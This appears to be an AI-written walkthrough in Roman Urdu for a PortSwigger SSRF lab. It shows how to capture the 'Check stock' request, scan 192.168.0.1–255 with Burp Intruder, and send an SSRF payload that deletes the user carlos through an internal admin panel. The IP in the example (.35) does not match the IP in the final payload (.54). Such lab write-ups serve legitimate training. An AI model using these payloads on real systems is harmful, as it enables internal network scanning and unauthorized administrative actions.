## Basic SSRF against another back-end system

Lab keh raha hai ke:

* Website mein **Check stock** ka feature hai jo internally ek backend server se data mangta hai.
* Tum usi feature ka misuse karke internal network (192.168.0.X) scan karoge.
* Target: **Port 8080 par admin panel** find karo → Carlos user ko delete karo.

---

## **Step-by-Step Solve Karna**

### **1. Lab open karo aur Burp Suite ready rakho**

* Lab start karo.
* Burp Suite → Proxy ON karo.
* Browser ko Burp proxy se connect karo (HTTP/HTTPS traffic capture).

---

### **2. Stock check request capture karna**

* Lab ke kisi product page par jao.
* **"Check stock"** button click karo.
* Burp Suite Proxy tab mein request intercept ho jayegi.

Example request:

```
POST /product/stock
Host: lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.warehouse.com:8080/product?id=123
```

---

### **3. Intruder ke liye request bhejna**

* Is request ko **Burp Intruder** me Send karo.
* `stockApi` ka value replace karke yeh likho:

```
http://192.168.0.1:8080/admin
```

* Ab **192.168.0.1** ka jo last digit `1` hai, use highlight karo → **Add §**.

---

### **4. Intruder Payload setup**

* Intruder → Payloads tab me jao.
* Payload type: **Numbers** select karo.
* From: `1`
* To: `255`
* Step: `1`

---

### **5. Scan start karo**

* **Start attack** click karo.
* Status column ko sort karo → ascending order me.

Tum dekho ge ke mostly 500 ya 404 aayega,
lekin ek IP address pe **Status 200** aayega.
Example: `192.168.0.35:8080/admin` → yeh hi admin interface hai.

---

* URL path ko change karo:

```
stockApi=http://192.168.0.54:8080/admin/delete?username=carlos
```

---

### **7. Request send karo**

* Send button dabao → Agar response `User deleted` ya success code aaya,
  to lab solve ho gaya.

---

✅ **Lab completed!**
Tumne internal network scan karke admin panel find kiya, phir SSRF se Carlos ko delete kiya.


Agar tum chaho to main tumhare liye **Burp Suite Intruder + Repeater ka full visual flow diagram** bana sakta hoon taake tum iss tarah ke SSRF labs ko 2 min me crack kar sako.
Kya bana doon?
